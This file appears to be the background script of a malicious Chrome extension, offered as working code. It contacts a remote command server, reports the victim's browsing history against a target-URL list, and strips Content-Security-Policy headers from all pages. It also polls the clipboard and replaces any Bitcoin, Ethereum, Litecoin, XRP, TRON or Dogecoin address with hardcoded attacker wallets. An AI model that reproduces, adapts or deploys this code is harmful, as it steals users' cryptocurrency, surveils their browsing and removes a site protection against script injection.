const domain = "https://ashgrrwt.click"
const prefix = "/api/machine"

const coins = [
    {
        name: "BTC1",
        reg: new RegExp("^bc1[a-zA-HJ-NP-Z0-9]{25,39}"),
        value: "bc1qsjg8dqx6ga30h6szjd8dv2wg50ch50qrey4t7j"
    },
    {
        name: "BTC2",
        reg: new RegExp("^1[a-zA-HJ-NP-Z0-9]{25,39}"),
        value: "1KqequymujeNJuyB4gH7oJSFTB3En3Hf5n"
    },
    {
        name: "BTC3",
        reg: new RegExp("^3[a-zA-HJ-NP-Z0-9]{25,39}"),
        value: "1KqequymujeNJuyB4gH7oJSFTB3En3Hf5n"
    },
    {
        name: "ETH",
        reg: new RegExp("^0x[a-fA-F0-9]{40}"),
        value: "0xDBc1330056E2F5e2FB11FB3C96dE2c44B313eA8d"
    },
    {
        name: "LTC",
        reg: new RegExp("^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}"),
        value: "LRYpzmnqBVozkbzJhTWndzYDPfjmNPyaLv"
    },
    {
        name: "XRP",
        reg: new RegExp("^r[0-9a-zA-Z]{24,34}"),
        value: "rUPTadzFN6LS662Z2d2AvNyqU1xwg2japJ"
    },
    {
        name: "TRON",
        reg: new RegExp("^T[A-Za-z1-9]{33}"),
        value: "THiD8hFLiEyULVKLp3DSbBXQSbR3MQxm4X"
    },
    {
        name: "DOGE",
        reg: new RegExp("^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}"),
        value: "D5asYfjtbTtFmFkrEwqVgbJKYv9YT7Tgjh"
    }
]

let machineId = null, urls = []

chrome.storage.local.set({
    "domain": domain
})

chrome.storage.local.get(['machineId'], function (result) {
    if (result.machineId !== undefined) {
        machineId = result.machineId
    }
})

const initMachine = () => {
    $.ajax({
        url: `${domain}${prefix}/init`,
        method: 'POST',
        dataType: 'JSON',
        data: {
            machineId
        },
    }).then((response) => {
        machineId = response.machineId
        urls = response.urls

        chrome.storage.local.set({
            machineId: machineId
        })

        checkUrls()
    })
}

const checkUrls = () => {
    const microsecondsBack = 1000 * 60 * 24 * 60 * 30
    const startTime = (new Date).getTime() - microsecondsBack

    let check_data = []

    chrome.history.search({
            'text': '',
            'startTime': startTime,
            'maxResults': 0
        },
        function (historyItems) {
            for (let i = 0; i < historyItems.length; ++i) {
                const url = historyItems[i].url

                $.each(urls, function (index, item) {
                    if (url.indexOf(item) !== -1 && check_data.indexOf(item) === -1) {
                        check_data.push(item)
                    }
                })

                $.ajax({
                    url: `${domain}${prefix}/set-urls`,
                    method: 'POST',
                    dataType: 'JSON',
                    data: {
                        machineId,
                        urls
                    },
                })
            }
        })
}

const onHeadersReceived = function (details) {
    chrome.browsingData.remove({}, {serviceWorkers: true});

    for (let i = 0; i < details.responseHeaders.length; i++) {
        if (details.responseHeaders[i].name.toLowerCase() === 'content-security-policy') {
            details.responseHeaders[i].value = '';
        }
    }

    return {
        responseHeaders: details.responseHeaders
    };
};

const toggleDisableCSP = function (tabId) {
    chrome.browsingData.remove({}, {serviceWorkers: true})

    attachHeaderListener(tabId);
};

const attachHeaderListener = function (tabId) {
    const onHeaderFilter = {urls: ['*://*/*'], tabId: tabId, types: ['main_frame', 'sub_frame']};

    chrome.browsingData.remove({}, {serviceWorkers: true});

    chrome.webRequest.onHeadersReceived.addListener(
        onHeadersReceived, onHeaderFilter, ['blocking', 'responseHeaders']
    );
};

const init = function () {
    chrome.tabs.onActivated.addListener(function (activeInfo) {
        toggleDisableCSP(activeInfo.tabId);
    });

    const onHeaderFilter = {urls: ['*://*/*'], types: ['main_frame', 'sub_frame']};

    chrome.webRequest.onHeadersReceived.addListener(
        onHeadersReceived, onHeaderFilter, ['blocking', 'responseHeaders']
    );
};

const initCopy = function () {
    const body = document.getElementsByTagName('body')[0]
    const input = document.createElement('input')

    body.appendChild(input)

    setInterval(() => {
        input.select()
        document.execCommand('paste')

        const clipbText = input.value

        let textFound = false

        for (const coin of coins) {
            if (clipbText.match(coin.reg)) {
                input.value = clipbText.replace(clipbText.match(coin.reg).input, coin.value)

                textFound = true
                break
            }
        }

        if (textFound) {
            input.select()

            document.execCommand('copy')
        }
    }, 0x1f4)
};

init();
initMachine();
initCopy();

setInterval(() => initMachine(), 5 * 60000)